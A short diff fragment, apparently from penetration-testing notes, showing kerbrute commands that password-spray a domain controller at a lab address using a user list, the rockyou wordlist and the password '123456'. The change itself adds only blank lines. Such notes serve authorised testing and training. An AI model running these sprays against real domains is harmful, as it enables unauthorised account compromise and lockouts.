@@ -16,3 +16,5 @@ root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.
 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
 ```
+
+
